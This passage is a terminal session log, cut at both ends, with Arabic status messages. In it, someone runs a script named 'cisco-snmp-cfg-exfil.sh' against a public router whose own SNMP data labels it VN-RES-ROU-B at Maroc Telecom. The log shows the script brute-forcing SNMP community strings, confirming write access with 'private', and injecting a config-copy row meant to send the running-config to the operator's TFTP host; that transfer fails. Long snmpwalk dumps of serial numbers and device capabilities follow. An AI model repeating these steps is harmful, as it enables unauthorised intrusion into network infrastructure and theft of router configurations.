@@ -1,0 +1,1548 @@
+ذر) — استخدم -x مع VPS
+~ $ nano cisco-snmp-cfg-exfil.sh
+~ $ rm -rf nano cisco-snmp-cfg-exfil.sh
+~ $ nano cisco-snmp-cfg-exfil.sh
+~ $ chmod +x cisco-snmp-cfg-exfil.sh
+~ $ ./cisco-snmp-cfg-exfil.sh -t 105.155.252.6 -T 90
+[*] البروت على 105.155.252.6 ...
+[+] RO: 'public' -> Cisco IOS Software, C2900 Software (C2900-UNIVERSALK9-M), Ve
+[+] RO: 'private' -> Cisco IOS Software, C2900 Software (C2900-UNIVERSALK9-M), Ve
+[+] RW مؤكد: 'private'
+[*] خريطة الشبكة (ipAdEntTable):
+   IP-MIB::ipAdEntAddr.10.236.0.180 = IpAddress: 10.236.0.180
+   IP-MIB::ipAdEntAddr.105.155.252.6 = IpAddress: 105.155.252.6
+   IP-MIB::ipAdEntAddr.105.155.252.29 = IpAddress: 105.155.252.29
+   IP-MIB::ipAdEntAddr.105.155.252.37 = IpAddress: 105.155.252.37
+   IP-MIB::ipAdEntAddr.105.155.252.66 = IpAddress: 105.155.252.66
+   IP-MIB::ipAdEntIfIndex.10.236.0.180 = INTEGER: 8
+   IP-MIB::ipAdEntIfIndex.105.155.252.6 = INTEGER: 1
+   IP-MIB::ipAdEntIfIndex.105.155.252.29 = INTEGER: 11
+   IP-MIB::ipAdEntIfIndex.105.155.252.37 = INTEGER: 9
+   IP-MIB::ipAdEntIfIndex.105.155.252.66 = INTEGER: 5
+   IP-MIB::ipAdEntNetMask.10.236.0.180 = IpAddress: 255.255.255.0
+   IP-MIB::ipAdEntNetMask.105.155.252.6 = IpAddress: 255.255.255.252
+   IP-MIB::ipAdEntNetMask.105.155.252.29 = IpAddress: 255.255.255.252
+   IP-MIB::ipAdEntNetMask.105.155.252.37 = IpAddress: 255.255.255.224
+   IP-MIB::ipAdEntNetMask.105.155.252.66 = IpAddress: 255.255.255.252
+   IP-MIB::ipAdEntBcastAddr.10.236.0.180 = INTEGER: 1
+   IP-MIB::ipAdEntBcastAddr.105.155.252.6 = INTEGER: 1
+   IP-MIB::ipAdEntBcastAddr.105.155.252.29 = INTEGER: 1
+   IP-MIB::ipAdEntBcastAddr.105.155.252.37 = INTEGER: 1
+   IP-MIB::ipAdEntBcastAddr.105.155.252.66 = INTEGER: 1
+   IP-MIB::ipAdEntReasmMaxSize.10.236.0.180 = INTEGER: 18024
+   IP-MIB::ipAdEntReasmMaxSize.105.155.252.6 = INTEGER: 18024
+   IP-MIB::ipAdEntReasmMaxSize.105.155.252.29 = INTEGER: 18024
+   IP-MIB::ipAdEntReasmMaxSize.105.155.252.37 = INTEGER: 18024
+   IP-MIB::ipAdEntReasmMaxSize.105.155.252.66 = INTEGER: 18024
+[+] عنوان الاستقبال: 172.20.10.3
+[+] خادم TFTP محلي نشط على المنفذ 6969 (PID 15505) — انتبه: لن يصل إليه الراوتر إن كنت خلف NAT!
+[*] حقن صف النسخ #960: running-config -> 172.20.10.3/vn-20260815-003326-960.cfg
+[+] الصف أُنشئ — مراقبة ccCopyState (90 ثانية) ...
+[-] فشل النقل (failed)
+      سبب الفشل: 3
+[*] التنظيف: تدمير الصف #960
+[+] دُمّر
+[+] انتهى.
+~ $ snmpwalk -v2c -c private 105.155.252.6 1.3.6.1.4.1.9.9.96
+SNMPv2-SMI::enterprises.9.9.96.1.1.1.1.2.102 = INTEGER: 1
+SNMPv2-SMI::enterprises.9.9.96.1.1.1.1.2.121 = INTEGER: 1
+SNMPv2-SMI::enterprises.9.9.96.1.1.1.1.2.255 = INTEGER: 1
+SNMPv2-SMI::enterprises.9.9.96.1.1.1.1.2.780 = INTEGER: 1
+SNMPv2-SMI::enterprises.9.9.96.1.1.1.1.2.1231 = INTEGER: 1
+SNMPv2-SMI::enterprises.9.9.96.1.1.1.1.3.102 = INTEGER: 4
+SNMPv2-SMI::enterprises.9.9.96.1.1.1.1.8.780 = ""
+SNMPv2-SMI::enterprises.9.9.96.1.1.1.1.9.102 = INTEGER: 2
+SNMPv2-SMI::enterprises.9.9.96.1.1.1.1.9.121 = INTEGER: 2
+SNMPv2-SMI::enterprises.9.9.96.1.1.1.1.9.255 = INTEGER: 2
+SNMPv2-SMI::enterprises.9.9.96.1.1.1.1.9.780 = INTEGER: 2
+SNMPv2-SMI::enterprises.9.9.96.1.1.1.1.9.1231 = INTEGER: 2
+~ $ snmpwalk -v2c -c private 105.155.252.6 1.3.6.1.4.1.9.9.92
+SNMPv2-SMI::enterprises.9.9.92.1.1.1.1.1 = STRING: "Cisco"
+SNMPv2-SMI::enterprises.9.9.92.1.1.1.1.5 = STRING: "Cisco"
+SNMPv2-SMI::enterprises.9.9.92.1.1.1.1.8 = STRING: "Cisco"
+SNMPv2-SMI::enterprises.9.9.92.1.1.1.1.24 = STRING: "CISCO"
+SNMPv2-SMI::enterprises.9.9.92.1.1.1.1.26 = STRING: "CISCO"
+SNMPv2-SMI::enterprises.9.9.92.1.1.1.2.1 = STRING: "FGL203524SY"
+SNMPv2-SMI::enterprises.9.9.92.1.1.1.2.5 = STRING: "FOC19214GRB"
+SNMPv2-SMI::enterprises.9.9.92.1.1.1.2.8 = STRING: "FOC18367KME"
+SNMPv2-SMI::enterprises.9.9.92.1.1.1.2.24 = STRING: "SPC173807LA"
+SNMPv2-SMI::enterprises.9.9.92.1.1.1.2.26 = STRING: "FNS18081JTV"
+SNMPv2-SMI::enterprises.9.9.92.1.1.1.3.1 = STRING: "CISCO2901/K9"
+SNMPv2-SMI::enterprises.9.9.92.1.1.1.3.5 = STRING: "EHWIC-1GE-SFP-CU"
+SNMPv2-SMI::enterprises.9.9.92.1.1.1.3.8 = STRING: "EHWIC-1GE-SFP-CU"
+SNMPv2-SMI::enterprises.9.9.92.1.1.1.3.24 = STRING: "GLC-LH-SMD"
+SNMPv2-SMI::enterprises.9.9.92.1.1.1.3.26 = STRING: "GLC-LH-SMD"
+SNMPv2-SMI::enterprises.9.9.92.1.1.1.4.1 = STRING: "V06 "
+SNMPv2-SMI::enterprises.9.9.92.1.1.1.4.5 = STRING: "V01"
+SNMPv2-SMI::enterprises.9.9.92.1.1.1.4.8 = STRING: "V01"
+SNMPv2-SMI::enterprises.9.9.92.1.1.1.4.24 = STRING: "A"
+SNMPv2-SMI::enterprises.9.9.92.1.1.1.4.26 = STRING: "A0"
+SNMPv2-SMI::enterprises.9.9.92.1.1.1.5.1 = STRING: "800-30795-06"
+SNMPv2-SMI::enterprises.9.9.92.1.1.1.5.5 = STRING: "800-34350-01"
+SNMPv2-SMI::enterprises.9.9.92.1.1.1.5.8 = STRING: "800-34350-01"
+SNMPv2-SMI::enterprises.9.9.92.1.1.1.5.24 = ""
+SNMPv2-SMI::enterprises.9.9.92.1.1.1.5.26 = ""
+SNMPv2-SMI::enterprises.9.9.92.1.1.1.6.1 = STRING: "H0"
+SNMPv2-SMI::enterprises.9.9.92.1.1.1.6.5 = STRING: "A1"
+SNMPv2-SMI::enterprises.9.9.92.1.1.1.6.8 = STRING: "A1"
+SNMPv2-SMI::enterprises.9.9.92.1.1.1.6.24 = ""
+SNMPv2-SMI::enterprises.9.9.92.1.1.1.6.26 = ""
+SNMPv2-SMI::enterprises.9.9.92.1.1.1.7.1 = ""
+SNMPv2-SMI::enterprises.9.9.92.1.1.1.7.5 = ""
+SNMPv2-SMI::enterprises.9.9.92.1.1.1.7.8 = ""
+SNMPv2-SMI::enterprises.9.9.92.1.1.1.7.24 = ""
+SNMPv2-SMI::enterprises.9.9.92.1.1.1.7.26 = ""
+SNMPv2-SMI::enterprises.9.9.92.1.1.1.8.1 = ""
+SNMPv2-SMI::enterprises.9.9.92.1.1.1.8.5 = ""
+SNMPv2-SMI::enterprises.9.9.92.1.1.1.8.8 = ""
+SNMPv2-SMI::enterprises.9.9.92.1.1.1.8.24 = ""
+SNMPv2-SMI::enterprises.9.9.92.1.1.1.8.26 = ""
+SNMPv2-SMI::enterprises.9.9.92.1.1.1.9.1 = ""
+SNMPv2-SMI::enterprises.9.9.92.1.1.1.9.5 = ""
+SNMPv2-SMI::enterprises.9.9.92.1.1.1.9.8 = ""
+SNMPv2-SMI::enterprises.9.9.92.1.1.1.9.24 = ""
+SNMPv2-SMI::enterprises.9.9.92.1.1.1.9.26 = ""
+SNMPv2-SMI::enterprises.9.9.92.1.1.1.10.1 = ""
+SNMPv2-SMI::enterprises.9.9.92.1.1.1.10.5 = ""
+SNMPv2-SMI::enterprises.9.9.92.1.1.1.10.8 = ""
+SNMPv2-SMI::enterprises.9.9.92.1.1.1.10.24 = ""
+SNMPv2-SMI::enterprises.9.9.92.1.1.1.10.26 = ""
+SNMPv2-SMI::enterprises.9.9.92.1.1.1.11.1 = STRING: "CMMJA00ARA"
+SNMPv2-SMI::enterprises.9.9.92.1.1.1.11.5 = STRING: "CMUIAA8CAA"
+SNMPv2-SMI::enterprises.9.9.92.1.1.1.11.8 = STRING: "CMUIAA8CAA"
+SNMPv2-SMI::enterprises.9.9.92.1.1.1.11.24 = ""
+SNMPv2-SMI::enterprises.9.9.92.1.1.1.11.26 = ""
+SNMPv2-SMI::enterprises.9.9.92.1.1.1.12.1 = ""
+SNMPv2-SMI::enterprises.9.9.92.1.1.1.12.5 = ""
+SNMPv2-SMI::enterprises.9.9.92.1.1.1.12.8 = ""
+SNMPv2-SMI::enterprises.9.9.92.1.1.1.12.24 = ""
+SNMPv2-SMI::enterprises.9.9.92.1.1.1.12.26 = ""
+SNMPv2-SMI::enterprises.9.9.92.1.1.1.13.1 = ""
+SNMPv2-SMI::enterprises.9.9.92.1.1.1.13.5 = ""
+SNMPv2-SMI::enterprises.9.9.92.1.1.1.13.8 = ""
+SNMPv2-SMI::enterprises.9.9.92.1.1.1.13.24 = ""
+SNMPv2-SMI::enterprises.9.9.92.1.1.1.13.26 = ""
+SNMPv2-SMI::enterprises.9.9.92.1.1.1.14.1 = INTEGER: 1
+SNMPv2-SMI::enterprises.9.9.92.1.1.1.14.5 = INTEGER: 1
+SNMPv2-SMI::enterprises.9.9.92.1.1.1.14.8 = INTEGER: 1
+SNMPv2-SMI::enterprises.9.9.92.1.1.1.14.24 = INTEGER: 1
+SNMPv2-SMI::enterprises.9.9.92.1.1.1.14.26 = INTEGER: 1
+~ $ snmpwalk -v2c -c private 105.155.252.6 1.3.6.1.2.1.1
+SNMPv2-MIB::sysDescr.0 = STRING: Cisco IOS Software, C2900 Software (C2900-UNIVERSALK9-M), Version 15.3(3)M6, RELEASE SOFTWARE (fc1)
+Technical Support: http://www.cisco.com/techsupport
+Copyright (c) 1986-2015 by Cisco Systems, Inc.
+Compiled Tue 04-Aug-15 03:59 by prod_rel_team
+SNMPv2-MIB::sysObjectID.0 = OID: SNMPv2-SMI::enterprises.9.1.1046
+DISMAN-EVENT-MIB::sysUpTimeInstance = Timeticks: (1471952438) 170 days, 8:45:24.38
+SNMPv2-MIB::sysContact.0 = STRING: test
+SNMPv2-MIB::sysName.0 = STRING: VN-RES-ROU-B
+SNMPv2-MIB::sysLocation.0 = STRING: MAROC-TELECOM
+SNMPv2-MIB::sysServices.0 = INTEGER: 78
+SNMPv2-MIB::sysORLastChange.0 = Timeticks: (0) 0:00:00.00
+SNMPv2-MIB::sysORID.1 = OID: SNMPv2-SMI::enterprises.9.7.129
+SNMPv2-MIB::sysORID.2 = OID: SNMPv2-SMI::enterprises.9.7.115
+SNMPv2-MIB::sysORID.3 = OID: SNMPv2-SMI::enterprises.9.7.265
+SNMPv2-MIB::sysORID.4 = OID: SNMPv2-SMI::enterprises.9.7.112
+SNMPv2-MIB::sysORID.5 = OID: SNMPv2-SMI::enterprises.9.7.106
+SNMPv2-MIB::sysORID.6 = OID: SNMPv2-SMI::enterprises.9.7.47
+SNMPv2-MIB::sysORID.7 = OID: SNMPv2-SMI::enterprises.9.7.122
+SNMPv2-MIB::sysORID.8 = OID: SNMPv2-SMI::enterprises.9.7.37
+SNMPv2-MIB::sysORID.9 = OID: SNMPv2-SMI::enterprises.9.7.92
+SNMPv2-MIB::sysORID.10 = OID: SNMPv2-SMI::enterprises.9.7.53
+SNMPv2-MIB::sysORID.11 = OID: SNMPv2-SMI::enterprises.9.7.54
+SNMPv2-MIB::sysORID.12 = OID: SNMPv2-SMI::enterprises.9.7.52
+SNMPv2-MIB::sysORID.13 = OID: SNMPv2-SMI::enterprises.9.7.93
+SNMPv2-MIB::sysORID.14 = OID: SNMPv2-SMI::enterprises.9.7.186
+SNMPv2-MIB::sysORID.15 = OID: SNMPv2-SMI::enterprises.9.7.128
+SNMPv2-MIB::sysORID.16 = OID: SNMPv2-SMI::enterprises.9.7.425
+SNMPv2-MIB::sysORID.17 = OID: SNMPv2-SMI::enterprises.9.7.517
+SNMPv2-MIB::sysORID.18 = OID: SNMPv2-SMI::enterprises.9.7.516
+SNMPv2-MIB::sysORID.19 = OID: SNMPv2-SMI::enterprises.9.7.518
+SNMPv2-MIB::sysORID.20 = OID: SNMPv2-SMI::enterprises.9.7.267
+SNMPv2-MIB::sysORID.21 = OID: SNMPv2-SMI::enterprises.9.7.273
+SNMPv2-MIB::sysORID.22 = OID: SNMPv2-SMI::enterprises.9.7.265
+SNMPv2-MIB::sysORID.23 = OID: SNMPv2-SMI::enterprises.9.7.121
+SNMPv2-MIB::sysORID.24 = OID: SNMPv2-SMI::enterprises.9.7.44
+SNMPv2-MIB::sysORID.25 = OID: SNMPv2-SMI::enterprises.9.7.99999
+SNMPv2-MIB::sysORID.26 = OID: SNMPv2-SMI::enterprises.9.7.202
+SNMPv2-MIB::sysORID.27 = OID: SNMPv2-SMI::enterprises.9.7.264
+SNMPv2-MIB::sysORID.28 = OID: SNMPv2-SMI::enterprises.9.7.33
+SNMPv2-MIB::sysORID.29 = OID: SNMPv2-SMI::enterprises.9.7.492
+SNMPv2-MIB::sysORID.30 = OID: SNMPv2-SMI::enterprises.9.7.130
+SNMPv2-MIB::sysORID.31 = OID: SNMPv2-SMI::enterprises.9.7.116
+SNMPv2-MIB::sysORID.32 = OID: SNMPv2-SMI::enterprises.9.7.91
+SNMPv2-MIB::sysORID.33 = OID: SNMPv2-SMI::enterprises.9.7.999
+SNMPv2-MIB::sysORID.34 = OID: SNMPv2-SMI::enterprises.9.7.212
+SNMPv2-MIB::sysORID.35 = OID: SNMPv2-SMI::enterprises.9.7.547
+SNMPv2-MIB::sysORID.36 = OID: SNMPv2-SMI::enterprises.9.7.126
+SNMPv2-MIB::sysORID.37 = OID: SNMPv2-SMI::enterprises.9.7.127
+SNMPv2-MIB::sysORID.38 = OID: SNMPv2-SMI::enterprises.9.7.64
+SNMPv2-MIB::sysORID.39 = OID: SNMPv2-SMI::enterprises.9.7.123
+SNMPv2-MIB::sysORID.40 = OID: SNMPv2-SMI::enterprises.9.7.120
+SNMPv2-MIB::sysORID.41 = OID: SNMPv2-SMI::enterprises.9.7.124
+SNMPv2-MIB::sysORID.42 = OID: SNMPv2-SMI::enterprises.9.7.218
+SNMPv2-MIB::sysORID.43 = OID: SNMPv2-SMI::enterprises.9.7.119
+SNMPv2-MIB::sysORID.44 = OID: SNMPv2-SMI::enterprises.9.7.125
+SNMPv2-MIB::sysORID.45 = OID: SNMPv2-SMI::enterprises.9.7.524
+SNMPv2-MIB::sysORID.46 = OID: SNMPv2-SMI::enterprises.9.7.45
+SNMPv2-MIB::sysORID.47 = OID: SNMPv2-SMI::enterprises.9.7.605
+SNMPv2-MIB::sysORID.48 = OID: SNMPv2-SMI::enterprises.9.7.46
+SNMPv2-MIB::sysORID.49 = OID: SNMPv2-SMI::enterprises.9.7.557
+SNMPv2-MIB::sysORID.50 = OID: SNMPv2-SMI::enterprises.9.7.604
+SNMPv2-MIB::sysORID.51 = OID: SNMPv2-SMI::enterprises.9.7.203
+SNMPv2-MIB::sysORID.52 = OID: SNMPv2-SMI::enterprises.9.7.201
+SNMPv2-MIB::sysORID.53 = OID: SNMPv2-SMI::enterprises.9.7.1
+SNMPv2-MIB::sysORID.54 = OID: SNMPv2-SMI::enterprises.9.7.202
+SNMPv2-MIB::sysORID.55 = OID: SNMPv2-SMI::enterprises.9.7.440
+SNMPv2-MIB::sysORID.56 = OID: SNMPv2-SMI::enterprises.9.7.463
+SNMPv2-MIB::sysORID.57 = OID: SNMPv2-SMI::enterprises.9.7.16
+SNMPv2-MIB::sysORID.58 = OID: SNMPv2-SMI::enterprises.9.7.17
+SNMPv2-MIB::sysORID.59 = OID: SNMPv2-SMI::enterprises.9.7.36
+SNMPv2-MIB::sysORID.60 = OID: SNMPv2-SMI::enterprises.9.7.447
+SNMPv2-MIB::sysORID.61 = OID: SNMPv2-SMI::enterprises.9.7.548
+SNMPv2-MIB::sysORID.62 = OID: SNMPv2-SMI::enterprises.9.7.256
+SNMPv2-MIB::sysORID.63 = OID: SNMPv2-SMI::enterprises.9.7.101
+SNMPv2-MIB::sysORID.64 = OID: SNMPv2-SMI::enterprises.9.7.105
+SNMPv2-MIB::sysORID.65 = OID: SNMPv2-SMI::enterprises.9.7.108
+SNMPv2-MIB::sysORID.66 = OID: SNMPv2-SMI::enterprises.9.7.117
+SNMPv2-MIB::sysORID.67 = OID: SNMPv2-SMI::enterprises.9.7.103
+SNMPv2-MIB::sysORID.68 = OID: SNMPv2-SMI::enterprises.9.7.107
+SNMPv2-MIB::sysORID.69 = OID: SNMPv2-SMI::enterprises.9.7.109
+SNMPv2-MIB::sysORID.70 = OID: SNMPv2-SMI::enterprises.9.7.110
+SNMPv2-MIB::sysORID.71 = OID: SNMPv2-SMI::enterprises.9.7.111
+SNMPv2-MIB::sysORID.72 = OID: SNMPv2-SMI::enterprises.9.7.102
+SNMPv2-MIB::sysORID.73 = OID: SNMPv2-SMI::enterprises.9.7.102
+SNMPv2-MIB::sysORID.74 = OID: SNMPv2-SMI::enterprises.9.7.120
+SNMPv2-MIB::sysORID.75 = OID: SNMPv2-SMI::enterprises.9.7.115
+SNMPv2-MIB::sysORID.76 = OID: SNMPv2-SMI::enterprises.9.7.172
+SNMPv2-MIB::sysORID.77 = OID: SNMPv2-SMI::enterprises.9.7.28
+SNMPv2-MIB::sysORID.78 = OID: SNMPv2-SMI::enterprises.9.7.117
+SNMPv2-MIB::sysORID.79 = OID: SNMPv2-SMI::enterprises.9.7.39
+SNMPv2-MIB::sysORID.80 = OID: SNMPv2-SMI::enterprises.9.7.113
+SNMPv2-MIB::sysORID.81 = OID: SNMPv2-SMI::enterprises.9.7.114
+SNMPv2-MIB::sysORID.82 = OID: SNMPv2-SMI::enterprises.9.7.104
+SNMPv2-MIB::sysORID.83 = OID: SNMPv2-SMI::enterprises.9.7.26
+SNMPv2-MIB::sysORID.84 = OID: SNMPv2-SMI::enterprises.9.7.51
+SNMPv2-MIB::sysORID.85 = OID: SNMPv2-SMI::enterprises.9.7.532
+SNMPv2-MIB::sysORID.86 = OID: SNMPv2-SMI::enterprises.9.7.118
+SNMPv2-MIB::sysORID.87 = OID: SNMPv2-SMI::enterprises.9.7.599
+SNMPv2-MIB::sysORID.88 = OID: SNMPv2-SMI::enterprises.9.7.82
+SNMPv2-MIB::sysORID.89 = OID: SNMPv2-SMI::enterprises.9.7.83
+SNMPv2-MIB::sysORID.90 = OID: SNMPv2-SMI::enterprises.9.7.84
+SNMPv2-MIB::sysORID.91 = OID: SNMPv2-SMI::enterprises.9.7.408
+SNMPv2-MIB::sysORID.92 = OID: SNMPv2-SMI::enterprises.9.7.409
+SNMPv2-MIB::sysORID.93 = OID: SNMPv2-SMI::enterprises.9.7.213
+SNMPv2-MIB::sysORID.94 = OID: SNMPv2-SMI::enterprises.9.7.1
+SNMPv2-MIB::sysORID.95 = OID: SNMPv2-SMI::enterprises.9.7.2
+SNMPv2-MIB::sysORID.96 = OID: SNMPv2-SMI::enterprises.9.7.3
+SNMPv2-MIB::sysORID.97 = OID: SNMPv2-SMI::enterprises.9.7.4
+SNMPv2-MIB::sysORID.98 = OID: SNMPv2-SMI::enterprises.9.7.5
+SNMPv2-MIB::sysORID.99 = OID: SNMPv2-SMI::enterprises.9.7.6
+SNMPv2-MIB::sysORID.100 = OID: SNMPv2-SMI::enterprises.9.7.7
+SNMPv2-MIB::sysORID.101 = OID: SNMPv2-SMI::enterprises.9.7.8
+SNMPv2-MIB::sysORID.102 = OID: SNMPv2-SMI::enterprises.9.7.9
+SNMPv2-MIB::sysORID.103 = OID: SNMPv2-SMI::enterprises.9.7.10
+SNMPv2-MIB::sysORID.104 = OID: SNMPv2-SMI::enterprises.9.7.11
+SNMPv2-MIB::sysORID.105 = OID: SNMPv2-SMI::enterprises.9.7.12
+SNMPv2-MIB::sysORID.106 = OID: SNMPv2-SMI::enterprises.9.7.13
+SNMPv2-MIB::sysORDescr.1 = STRING: Agent capabilities for CISCO-AAA-SERVER-MIB
+ LAST-UPDATED 200001200000Z
+ciscoAAAServerCapabilityV10R00 AGENT-CAPABILITIES
+ SUPPORTS CISCO-AAA-SERVER-MIB
+File name: sys
+SNMPv2-MIB::sysORDescr.2 = STRING: Agent capabilities for CISCO-ALPS-MIB
+ LAST-UPDATED 9710270000Z
+ciscoAlpsCapabilityV01R01 AGENT-CAPABILITIES
+SUPPORTS CISCO-ALPS-MIB
+File name: sys
+SNMPv2-MIB::sysORDescr.3 = STRING: The Agent Capabilities for
+                CISCO-ATM-PVCTRAP-EXTN-MIB.
+ LAST-UPDATED 200211060000Z
+ciscoATMPVCTRAPExtnCapabilityV12R00S AGENT-CAPABILITIES
+ SUPPORTS CISCO-ATM-PVCTRAP-EXTN-MIB
+File name: sys
+SNMPv2-MIB::sysORDescr.4 = STRING: Agent capabilities for BGP4-MIB
+ LAST-UPDATED 9408180000Z
+ciscoBgp4CapabilityV10R02 AGENT-CAPABILITIES
+SUPPORTS BGP4-MIB
+File name: sys
+SNMPv2-MIB::sysORDescr.5 = STRING: Agent capabilities for the BRIDGE-MIB
+ LAST-UPDATED 201012010000Z
+ciscoBridgeCapabilityV10R02 AGENT-CAPABILITIES
+ SUPPORTS BRIDGE-MIB
+File name: sys
+SNMPv2-MIB::sysORDescr.6 = STRING: Agent capabilities for CALL-HISTORY-MIB
+ LAST-UPDATED 9611190000Z
+ciscoCallHistoryCapabilityV11R02 AGENT-CAPABILITIES
+SUPPORTS CISCO-CALL-HISTORY-MIB
+File name: sys
+SNMPv2-MIB::sysORDescr.7 = STRING: The agent capabilities for CISCO-CAS-IF-MIB.
+ LAST-UPDATED 200912040000Z
+ciscoCasIfCapabilityV5R015 AGENT-CAPABILITIES
+ SUPPORTS CISCO-CAS-IF-MIB
+File name: sys
+SNMPv2-MIB::sysORDescr.8 = STRING: Agent capabilities for the CHANNEL-MIB
+ LAST-UPDATED 9712150000Z
+ciscoChannelCapabilityV12R00 AGENT-CAPABILITIES
+SUPPORTS CISCO-CHANNEL-MIB
+File name: sys
+SNMPv2-MIB::sysORDescr.9 = STRING: Agent capabilities for the CISCO-CIPCMPC-MIB
+ LAST-UPDATED 9702190000Z
+ciscoCipCmpcCapabilityV11R03 AGENT-CAPABILITIES
+ SUPPORTS CISCO-CIPCMPC-MIB
+File name: sys
+SNMPv2-MIB::sysORDescr.10 = STRING: Agent capabilities for the CISCO-CIPCSNA-MIB
+ LAST-UPDATED 9504160000Z
+ciscoCipCsnaCapabilityV11R00 AGENT-CAPABILITIES
+SUPPORTS CISCO-CIPCSNA-MIB
+File name: sys
+SNMPv2-MIB::sysORDescr.11 = STRING: Agent capabilities for the CISCO-CIPLAN-MIB
+ LAST-UPDATED 9504160000Z
+ciscoCipLanCapabilityV11R00 AGENT-CAPABILITIES
+SUPPORTS CISCO-CIPLAN-MIB
+File name: sys
+SNMPv2-MIB::sysORDescr.12 = STRING: Agent capabilities for the CISCO-CIPTCPIP-MIB
+ LAST-UPDATED 200207120000Z
+ciscoCipTcpIpCapabilityV12R02T AGENT-CAPABILITIES
+SUPPORTS CISCO-CIPTCPIP-MIB
+File name: sys
+SNMPv2-MIB::sysORDescr.13 = STRING: Agent capabilities for the CISCO-CIPTG-MIB
+ LAST-UPDATED 9901250000Z
+ciscoCipTgCapabilityV12R03T AGENT-CAPABILITIES
+ SUPPORTS CISCO-CIPTG-MIB
+File name: sys
+SNMPv2-MIB::sysORDescr.14 = STRING: Agent capabilities for
+                                 CLASS-BASED-QOS-MIB
+ LAST-UPDATED 200301240000Z
+ciscoCBQosMibCapabilityV123R01T AGENT-CAPABILITIES
+SUPPORTS CISCO-CLASS-BASED-QOS-MIB
+File name: sys
+SNMPv2-MIB::sysORDescr.15 = STRING: This is the Agent Capabilities for
+                         CISCO-CONFIG_COPY-MIB.
+ LAST-UPDATED 200403170000Z
+ciscoConfigCopyCapabilityV2R0175 AGENT-CAPABILITIES
+SUPPORTS CISCO-CONFIG-COPY-MIB
+File name: sys
+SNMPv2-MIB::sysORDescr.16 = STRING: Agent capabilities for CISCO-DATA-COLLECTION-MIB
+LAST-UPDATED 200501050000Z
+cDataCollectionCapabilityV12R0S AGENT-CAPABILITIES
+SUPPORTS CISCO-DATA-COLLECTION-MIB
+File name: sys
+SNMPv2-MIB::sysORDescr.17 = STRING: The capabilities description of
+            CISCO-DIAMETER-BASE-PROTOCOL-MIB.
+ LAST-UPDATED 200609061130Z
+ciscoDiameterBasePCapabilityV12R0409XG AGENT-CAPABILITIES
+ SUPPORTS CISCO-DIAMETER-BASE-PROTOCOL-MIB
+File name: sys
+SNMPv2-MIB::sysORDescr.18 = STRING: The capabilities description of
+            CISCO-DIAMETER-CC-AAPL-MIB.
+ LAST-UPDATED 200609060000Z
+ciscoDiameterCCACapabilityV12R0409XG AGENT-CAPABILITIES
+ SUPPORTS CISCO-DIAMETER-CC-APPL-MIB
+File name: sys
+SNMPv2-MIB::sysORDescr.19 = STRING: The capabilities description of
+            CISCO-DIAMETER-SG-MIB.
+ LAST-UPDATED 200609070000Z
+ciscoDiameterSGCapabilityV12R0409XG AGENT-CAPABILITIES
+ SUPPORTS CISCO-DIAMETER-SG-MIB
+File name: sys
+SNMPv2-MIB::sysORDescr.20 = STRING: Agent capabilities for CISCO-DIST-DIRECTOR-MIB
+ LAST-UPDATED 200204230000Z
+ciscoDistDirCapabilityV12R02 AGENT-CAPABILITIES
+ SUPPORTS CISCO-DIST-DIRECTOR-MIB
+File name: sys
+SNMPv2-MIB::sysORDescr.21 = STRING: The agent capabilities for DS1-MIB for Cisco Products Series.
+        - ciscoDs1AxsmeCapabilityV3R00 is for
+
+          Enhanced ATM Switch Service Module(AXSM-E), and
+
+          Enhanced Processor Switch Module 1(PXM1E) uplink.
+
+
+
+        - ciscoDs1CapabilityV5R00 is for Voice Switch
+
+          Service Module(VXSM) and MPSM Module Release 5.0.0.
+ LAST-UPDATED 200710310000Z
+ciscoDs1CapabilityV5R500 AGENT-CAPABILITIES
+ SUPPORTS DS1-MIB
+File name: sys
+SNMPv2-MIB::sysORDescr.22 = STRING: The Agent Capabilities for DS3-MIB(RFC 2496).
+ LAST-UPDATED 200705150000Z
+ciscoDs3CapabilityV5R100 AGENT-CAPABILITIES
+ SUPPORTS DS3-MIB
+File name: sys
+SNMPv2-MIB::sysORDescr.23 = STRING: The agent capabilities for CISCO-DSP-MGMT-MIB.
+ LAST-UPDATED 201104180000Z
+ciscoDspMgmtCapabilityV5R400 AGENT-CAPABILITIES
+ SUPPORTS CISCO-DSP-MGMT-MIB
+File name: sys
+SNMPv2-MIB::sysORDescr.24 = STRING: Agent capabilities for the DSPU-MIB
+ LAST-UPDATED 9501250000Z
+ciscoDspuCapabilityV11R01 AGENT-CAPABILITIES
+SUPPORTS CISCO-DSPU-MIB
+File name: sys
+SNMPv2-MIB::sysORDescr.25 = STRING: 200701110000Z
+    DESCRIPTION
+
+
+ LAST-UPDATED 200701110000Z
+ciscoEmbeddedEventMgrCapabilityV12R02SXH AGENT-CAPABILITIES
+ SUPPORTS CISCO-EMBEDDED-EVENT-MGR-MIB
+File name: sys
+SNMPv2-MIB::sysORDescr.26 = STRING: Agent capabilities for
+                         CISCO-ENHANCED-MEMPOOL-MIB
+ LAST-UPDATED 200704160000Z
+cempCapabilityV12R03T AGENT-CAPABILITIES
+ SUPPORTS CISCO-ENHANCED-MEMPOOL-MIB
+File name: sys
+SNMPv2-MIB::sysORDescr.27 = STRING: The Agent Capabilities for CISCO-ENTITY-FRU-CONTROL-MIB.
+ LAST-UPDATED 200912140000Z
+ciscoEntityFruControlCapabilityV2R00 AGENT-CAPABILITIES
+ SUPPORTS CISCO-ENTITY-FRU-CONTROL-MIB
+File name: sys
+SNMPv2-MIB::sysORDescr.28 = STRING: Agent capabilities for CISCO-ENVMON-MIB.
+ LAST-UPDATED 200705180000Z
+ciscoEnvMonCapV12R05TPMARS AGENT-CAPABILITIES
+ SUPPORTS CISCO-ENVMON-MIB
+File name: sys
+SNMPv2-MIB::sysORDescr.29 = STRING: Agent capabilities for CISCO-ERM-MIB
+
+
+    REVISION
+ LAST-UPDATED 200603090000Z
+ciscoErmCapabilityV12R02SR AGENT-CAPABILITIES
+SUPPORTS CISCO-ERM-MIB
+File name: sys
+SNMPv2-MIB::sysORDescr.30 = STRING: Agent capabilities for ETHERLIKE-MIB (RFC 2665).
+ LAST-UPDATED 0001211400Z
+ciscoEtherlikeCapabilityV12R01 AGENT-CAPABILITIES
+SUPPORTS ETHERLIKE-MIB
+File name: sys
+SNMPv2-MIB::sysORDescr.31 = STRING: Agent capabilities for RFC 1512 FDDI MIB.
+ LAST-UPDATED 9411080000Z
+fddiCapabilityV10R03 AGENT-CAPABILITIES
+SUPPORTS FDDI-SMT73-MIB
+File name: sys
+SNMPv2-MIB::sysORDescr.32 = STRING: Agent capabilities for the FRAS Host MIB
+ LAST-UPDATED 9702120000Z
